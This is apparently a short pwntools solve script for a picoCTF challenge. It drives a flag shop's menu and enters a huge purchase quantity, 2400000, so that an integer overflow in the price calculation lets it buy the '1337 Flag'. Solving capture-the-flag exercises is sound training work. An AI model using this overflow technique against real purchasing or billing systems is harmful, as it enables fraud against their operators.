#!/usr/bin/env python3

from pwn import *

ip = "jupiter.challenges.picoctf.org"
port = 4906

context.log_level = "error"
r = remote(ip, port)

z = r.recvuntil(b"Enter a menu selection\n").decode()
print(z)
r.sendline(b"2")    # Choose "Buy Flags"
z = r.recvuntil(b"2. 1337 Flag\n").decode()
print(z)
r.sendline(b"1")    # Choose "Defintely not the flag Flag"
z = r.recvline().decode()
print(z)
r.sendline(b"2400000")  # Type a number that causes overflow. Since 2147483647 / 900 is about 2386093, let's choose 2400000
z = r.recvuntil(b"Enter a menu selection\n").decode()
print(z)
r.sendline(b"2")    # Choose "Buy Flags" again
z = r.recvuntil(b"2. 1337 Flag\n").decode()
print(z)
r.sendline(b"2")    # Choose "1337 Flag"
z = r.recvuntil(b"Enter 1 to buy one").decode()
print(z)
r.sendline(b"1")    # Enter 1 and then get the flag
z = r.recvline().decode()
print(z)

